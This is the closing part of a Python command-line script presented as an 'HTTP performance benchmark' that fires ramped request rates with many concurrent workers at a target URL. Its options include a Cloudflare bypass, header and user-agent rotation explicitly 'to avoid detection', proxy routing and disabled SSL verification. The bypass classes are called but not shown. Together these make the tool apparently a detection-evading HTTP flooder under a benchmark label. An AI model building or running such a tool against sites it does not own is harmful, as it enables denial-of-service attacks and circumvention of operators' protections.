        help=f"Duration per stage in seconds (default: {DEFAULT_STAGE_DURATION})",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=DEFAULT_CONCURRENCY,
        help=f"Number of concurrent workers (default: {DEFAULT_CONCURRENCY})",
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=DEFAULT_RETRIES,
        help=f"Number of retries per request (default: {DEFAULT_RETRIES})",
    )
    parser.add_argument(
        "--warmup",
        type=int,
        default=DEFAULT_WARMUP,
        help=f"Warmup duration in seconds (default: {DEFAULT_WARMUP})",
    )
    
    parser.add_argument(
        "--bypass-cloudflare",
        action="store_true",
        help="Enable Cloudflare bypass strategies",
    )
    parser.add_argument(
        "--rotate-headers",
        action="store_true",
        help="Rotate headers to avoid detection",
    )
    parser.add_argument(
        "--user-agents",
        help="Comma-separated list of User-Agents to use",
    )
    
    parser.add_argument(
        "--output",
        help="Output directory for results",
    )
    parser.add_argument(
        "--format",
        choices=["json", "csv"],
        default="json",
        help="Output format (default: json)",
    )
    
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})",
    )
    parser.add_argument(
        "--headers",
        type=json.loads,
        help="Additional headers as JSON",
    )
    parser.add_argument(
        "--cookies",
        type=json.loads,
        help="Cookies as JSON",
    )
    parser.add_argument(
        "--proxy",
        help="Proxy URL (e.g., http://proxy:8080)",
    )
    parser.add_argument(
        "--no-ssl-verify",
        action="store_true",
        help="Disable SSL verification",
    )
    
    parser.add_argument(
        "--no-dashboard",
        action="store_true",
        help="Disable rich dashboard (use simple output)",
    )
    
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose logging",
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help="Suppress all output except errors",
    )
    
    return parser.parse_args()


# ============================================
# MAIN EXECUTION
# ============================================

async def main_async(args: argparse.Namespace) -> None:
    console = Console()
    
    ssl_context = None
    if args.no_ssl_verify:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
    
    connector = aiohttp.TCPConnector(
        limit=args.concurrency,
        limit_per_host=args.concurrency,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
        ssl=ssl_context,
    )
    
    timeout = aiohttp.ClientTimeout(total=args.timeout)
    
    headers = {
        "User-Agent": "Advanced-Performance-Benchmark/4.0",
        "Accept": "*/*",
    }
    if args.headers:
        headers.update(args.headers)
    
    cookies = args.cookies if args.cookies else {}
    proxy = args.proxy if args.proxy else None
    
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        headers=headers,
        cookies=cookies,
    ) as session:
        
        cf_session = CloudflareSession(session, args.url, proxy)
        
        if args.user_agents:
            user_agents = [ua.strip() for ua in args.user_agents.split(",") if ua.strip()]
            if user_agents:
                CloudflareBypass.USER_AGENTS = user_agents
        
        stages = parse_ramp(args.ramp)
        total_stages = len(stages)
        
        if not args.quiet:
            bypass_info = "✅ Enabled" if args.bypass_cloudflare else "❌ Disabled"
            rotate_info = "✅" if args.rotate_headers else "❌"
            
            console.print(Panel.fit(
                "[bold cyan]🚀 Advanced HTTP Performance Benchmark with Cloudflare Bypass[/bold cyan]\n"
                f"[white]Target: {args.url}[/white]\n"
                f"[white]Method: {args.method}[/white]\n"
                f"[white]Stages: {', '.join(f'{s:.1f}' for s in stages)} RPS[/white]\n"
                f"[white]Duration: {args.stage_duration}s per stage[/white]\n"
                f"[white]Concurrency: {args.concurrency} workers[/white]\n"
                f"[white]Cloudflare Bypass: {bypass_info}[/white]\n"
                f"[white]Rotate Headers: {rotate_info}[/white]",
                border_style="cyan",
            ))
        
        stage_results: List[List[Result]] = []
        stopped_early = False
        
        for index, rps in enumerate(stages, start=1):
            if not args.quiet:
                console.print(f"\n[bold yellow]▶ Starting stage {index}/{total_stages}: {rps:.1f} RPS[/bold yellow]")
            
            results, elapsed, reason = await run_stage(
                cf_session=cf_session,
                url=args.url,
                duration=args.stage_duration,
                concurrency=args.concurrency,
                rps=rps,
                stage_num=index,
                total_stages=total_stages,
                console=console,
                use_dashboard=not args.no_dashboard and not args.quiet,
                retries=args.retries,
                method=args.method,
                payload=args.payload,
                warmup=args.warmup if index == 1 else 0,
                rotate_headers=args.rotate_headers,
            )
            
            stage_results.append(results)
            
            if not args.quiet:
                print_stage_report(index, rps, results, elapsed, console)
            
            if args.output:
                await save_results(results, args.output, args.format)
            
            if reason:
                console.print(f"\n[bold red]🛑 STOPPING RAMP: {reason}[/bold red]")
                stopped_early = True
                break
            
            console.print(f"[green]✓ Stage {index} completed successfully[/green]\n")
        
        if not args.quiet and not stopped_early:
            console.print(Panel.fit(
                "[bold green]✅ All stages completed successfully![/bold green]",
                border_style="green",
            ))
        elif stopped_early:
            console.print(Panel.fit(
                f"[bold red]❌ Benchmark stopped early at stage {index}[/bold red]",
                border_style="red",
            ))


def main() -> None:
    args = parse_args()
    
    if args.stage_duration <= 0:
        raise SystemExit("Stage duration must be greater than 0.")
    
    if not (1 <= args.concurrency <= MAX_CONCURRENCY):
        raise SystemExit(f"Concurrency must be between 1 and {MAX_CONCURRENCY}.")
    
    log_level = logging.DEBUG if args.verbose else logging.WARNING
    if args.quiet:
        log_level = logging.ERROR
    
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s %(levelname)s %(message)s",
    )
    
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        console = Console()
        console.print("\n\n[yellow]⚠️ Benchmark stopped by user.[/yellow]")
        sys.exit(0)
    except Exception as e:
        console = Console()
        console.print(f"\n[bold red]❌ Error: {e}[/bold red]")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
